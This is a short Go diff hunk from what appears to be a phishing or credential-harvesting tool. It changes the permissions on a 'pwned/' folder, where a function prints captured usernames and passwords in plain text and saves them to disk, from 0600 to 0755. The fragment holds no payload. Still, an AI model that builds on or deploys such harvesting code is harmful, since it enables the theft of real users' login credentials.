@@ -181,14 +181,14 @@ func (p *Login) lmaoOwnedInfo(choice string) error {
 	path := "pwned/" + choice
 
 	if _, err := os.Stat(path); os.IsNotExist(err) {
-		os.Mkdir(path, 0600)
+		os.Mkdir(path, 0755)
 	}
 	fmt.Println("[!] Login retrieved!")
 	fmt.Println("[!] Username: " + p.Username)
 	fmt.Println("[!] Password: " + p.Password)
 	fmt.Println("[*] Saved to " + path + "/" + filename)
 
-	return ioutil.WriteFile(path+"/"+filename, b, 0600)
+	return ioutil.WriteFile(path+"/"+filename, b, 0755)
 }
 
 func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
